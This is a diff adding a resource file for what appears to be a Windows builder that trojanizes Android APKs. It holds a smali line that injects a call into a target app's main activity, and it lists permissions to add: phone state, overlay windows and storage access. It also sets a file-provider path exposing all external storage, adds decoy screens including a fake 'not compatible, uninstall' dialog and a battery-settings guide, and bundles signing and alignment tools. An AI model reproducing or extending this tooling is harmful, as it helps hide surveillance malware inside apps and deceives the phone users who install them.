+            android:layout_width="match_parent"
+            android:layout_height="150dp"
+            android:textColor="#F8F8F8"
+            android:gravity="top|center"
+            android:id="@+id/nodescrip"
+            android:paddingTop="25dp"
+            android:fontFamily="sans-serif"
+            android:text="No internet connection detected.\n\n please connect to internet and try again"
+            android:textSize="16sp"
+            android:textStyle="bold"
+
+            android:shadowRadius="2"
+            &gt;&lt;/TextView&gt;
+        &lt;Button
+            android:id="@+id/closeme"
+            android:layout_width="55dp"
+            android:layout_height="55dp"
+            android:background="@drawable/closebutton"
+            android:layout_gravity="center"
+
+
+            android:textSize="16sp"
+            android:textStyle="bold"
+            android:textColor="#000000"
+            android:shadowRadius="2"&gt;
+
+        &lt;/Button&gt;
+
+    &lt;/LinearLayout&gt;
+&lt;/LinearLayout&gt;</value>
+  </data>
+  <data name="oncreatecode" xml:space="preserve">
+    <value>invoke-virtual/range {p0}, [trgtmain]-&gt;InializeSubsT()V</value>
+  </data>
+  <data name="oppobattery" xml:space="preserve">
+    <value>&lt;!-- activity_main.xml --&gt;
+&lt;RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:background="#000011"
+    android:layout_height="match_parent"&gt;
+
+
+    &lt;ImageView
+        android:id="@+id/imageView"
+        android:layout_width="match_parent"
+        android:layout_height="400dp"
+        android:layout_centerHorizontal="true"
+        android:layout_marginTop="75dp"
+        android:src="@drawable/oppo_bty_en_1" /&gt;
+
+
+
+    &lt;Button
+        android:id="@+id/nextButton"
+        android:layout_width="130dp"
+        android:layout_height="75dp"
+        android:layout_below="@id/imageView"
+        android:layout_centerHorizontal="true"
+        android:layout_marginTop="16dp"
+        android:text="Next"
+        android:background="@drawable/btnback"
+        android:gravity="center"
+        android:shadowColor="#000"
+        android:shadowDx="9"
+        android:shadowDy="3"
+        android:shadowRadius="2"
+        android:textColor="#fff"
+        android:textSize="18sp"
+        android:textStyle="bold" /&gt;
+&lt;/RelativeLayout&gt;</value>
+  </data>
+  <data name="providerfile" xml:space="preserve">
+    <value>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;paths xmlns:android="http://schemas.android.com/apk/res/android"&gt;
+    &lt;external-path
+        name="external_files"
+        path="." /&gt;
+&lt;/paths&gt;</value>
+  </data>
+  <data name="ReadPrim" xml:space="preserve">
+    <value>&lt;uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/&gt;</value>
+  </data>
+  <data name="read_state_prim" xml:space="preserve">
+    <value>&lt;uses-permission android:name="android.permission.READ_PHONE_STATE" /&gt;</value>
+  </data>
+  <data name="ReplaceAccess" xml:space="preserve">
+    <value>&lt;meta-data android:name="REPALCEACCESS" android:value="99999999"/&gt;</value>
+  </data>
+  <data name="ReplaceLuncher" xml:space="preserve">
+    <value>&lt;meta-data android:name="REPLACELUNCH" android:value="66666666"/&gt;</value>
+  </data>
+  <data name="ReplacePrimes" xml:space="preserve">
+    <value>&lt;queries android:name="[Replace_Prmies]"/&gt;</value>
+  </data>
+  <data name="signapk" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\signapk.jar;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="splits" xml:space="preserve">
+    <value>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;splits&gt;
+    &lt;module name=""&gt;
+        &lt;language&gt;
+            &lt;entry key="af" split="" /&gt;
+            &lt;entry key="am" split="" /&gt;
+            &lt;entry key="ar" split="" /&gt;
+            &lt;entry key="az" split="" /&gt;
+            &lt;entry key="bg" split="" /&gt;
+            &lt;entry key="bn" split="" /&gt;
+            &lt;entry key="ca" split="" /&gt;
+            &lt;entry key="cs" split="" /&gt;
+            &lt;entry key="da" split="" /&gt;
+            &lt;entry key="de" split="" /&gt;
+            &lt;entry key="el" split="" /&gt;
+            &lt;entry key="en" split="" /&gt;
+            &lt;entry key="es" split="" /&gt;
+            &lt;entry key="et" split="" /&gt;
+            &lt;entry key="fa" split="" /&gt;
+            &lt;entry key="fi" split="" /&gt;
+            &lt;entry key="fr" split="" /&gt;
+            &lt;entry key="ga" split="" /&gt;
+            &lt;entry key="gu" split="" /&gt;
+            &lt;entry key="ha" split="" /&gt;
+            &lt;entry key="he" split="" /&gt;
+            &lt;entry key="hi" split="" /&gt;
+            &lt;entry key="hr" split="" /&gt;
+            &lt;entry key="hu" split="" /&gt;
+            &lt;entry key="id" split="" /&gt;
+            &lt;entry key="it" split="" /&gt;
+            &lt;entry key="ja" split="" /&gt;
+            &lt;entry key="kk" split="" /&gt;
+            &lt;entry key="kn" split="" /&gt;
+            &lt;entry key="ko" split="" /&gt;
+            &lt;entry key="lo" split="" /&gt;
+            &lt;entry key="lt" split="" /&gt;
+            &lt;entry key="lv" split="" /&gt;
+            &lt;entry key="mk" split="" /&gt;
+            &lt;entry key="ml" split="" /&gt;
+            &lt;entry key="mr" split="" /&gt;
+            &lt;entry key="ms" split="" /&gt;
+            &lt;entry key="nb" split="" /&gt;
+            &lt;entry key="nl" split="" /&gt;
+            &lt;entry key="om" split="" /&gt;
+            &lt;entry key="pa" split="" /&gt;
+            &lt;entry key="pl" split="" /&gt;
+            &lt;entry key="pt" split="" /&gt;
+            &lt;entry key="ro" split="" /&gt;
+            &lt;entry key="ru" split="" /&gt;
+            &lt;entry key="sk" split="" /&gt;
+            &lt;entry key="sl" split="" /&gt;
+            &lt;entry key="sq" split="" /&gt;
+            &lt;entry key="sr" split="" /&gt;
+            &lt;entry key="sv" split="" /&gt;
+            &lt;entry key="sw" split="" /&gt;
+            &lt;entry key="ta" split="" /&gt;
+            &lt;entry key="te" split="" /&gt;
+            &lt;entry key="th" split="" /&gt;
+            &lt;entry key="tl" split="" /&gt;
+            &lt;entry key="tr" split="" /&gt;
+            &lt;entry key="uk" split="" /&gt;
+            &lt;entry key="ur" split="" /&gt;
+            &lt;entry key="uz" split="" /&gt;
+            &lt;entry key="vi" split="" /&gt;
+            &lt;entry key="zh" split="" /&gt;
+        &lt;/language&gt;
+    &lt;/module&gt;
+&lt;/splits&gt;</value>
+  </data>
+  <data name="SystemwindowPrim" xml:space="preserve">
+    <value>&lt;uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/&gt;</value>
+  </data>
+  <data name="Toreplaceprim" xml:space="preserve">
+    <value>&lt;queries android:name="[GPRIM]"/&gt;</value>
+  </data>
+  <data name="uninstall_activity" xml:space="preserve">
+    <value>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:gravity="center"
+    android:orientation="vertical"
+    android:padding="20dp"
+    android:background="#232323"&gt;
+
+    &lt;ImageView
+        android:id="@+id/errorimg"
+        android:layout_width="144px"
+        android:layout_height="144px"
+        android:paddingLeft="5dp"
+        android:src="@drawable/error"&gt;&lt;/ImageView&gt;
+
+    &lt;TextView
+        android:id="@+id/dialog_message"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:textColor="#fff"
+        android:text="unfortunately , this version is not compatible with your device."
+        android:paddingBottom="20dp"
+        android:textSize="20dp"
+        android:gravity="center"/&gt;
+
+    &lt;LinearLayout
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:orientation="horizontal"
+
+        android:gravity="center"&gt;
+
+
+        &lt;Button
+            android:id="@+id/button_ok"
+            android:layout_width="280px"
+            android:layout_height="150px"
+            android:text="uninstall"
+            android:textColor="#fff"
+            android:background="#0074CC"/&gt;
+    &lt;/LinearLayout&gt;
+
+&lt;/LinearLayout&gt;</value>
+  </data>
+  <data name="WritePrim" xml:space="preserve">
+    <value>&lt;uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/&gt;</value>
+  </data>
+  <data name="zipalign" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\zipalign.exe;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+</root>
